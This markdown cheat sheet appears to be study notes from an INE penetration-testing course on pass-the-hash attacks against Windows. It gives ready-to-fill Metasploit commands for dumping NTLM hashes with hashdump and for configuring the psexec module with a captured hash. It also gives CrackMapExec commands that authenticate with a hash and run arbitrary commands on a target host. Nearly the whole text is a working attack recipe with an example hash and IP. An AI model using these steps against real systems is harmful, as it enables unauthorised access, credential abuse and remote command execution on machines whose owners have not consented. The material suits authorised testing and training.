# Pass-The-Hash

* [Metasploit](#metasploit)
* [Crackmapexec](#crackmapexec)
* [References](#references)

***********************************************************************
Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
Note: Bracket characters themselves [ ] require removal. See examples.
***********************************************************************

## Metasploit

### Kiwi

```
hashdump
```

#### Format:

[USERNAME]:[RID]:[LM-HASH]:[NTLM-HASH]:::  

#### Example:  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d:::


*LM Hash is the same for every user, the NTLM hash is unique.*

### PSExec

```
search psexec
```
```
use use exploit/windows/smb/psexec
```
```
set SMBUser [USERNAME]
```
```
set SMBPass [LM-HASH]:[NTLM-HASH]
```
Example:
```
set SMBPass aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d
```
```
set target Native\ upload
```
*Target may not need to be set, or may need to be set to something else. Might have to try a few differnet targets to get this to work*
Set RHOSTS, LPORT, & possibly other options and exploit*

***********************************************************************

## Crackmapexec

Check for Pwnage:
```
crackmapexec smb [TARGET-IP] -u [USERNAME] -H "[NTLM-HASH]"
```
Example:
```
crackmapexec smb 10.3.31.187 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d"
```

Once Pwn3d, issue commands like this:
```
crackmapexec smb [TARGET-IP] -u [USERNAME] -H "[NTLM-HASH]" -x "[COMMAND]"
```
*Ignore python script errors*

***********************************************************************

### References
Penetration Tester Student v2 by INE  
https://my.ine.com/CyberSecurity/learning-paths/61f88d91-79ff-4d8f-af68-873883dbbd8c/penetration-testing-student-v2
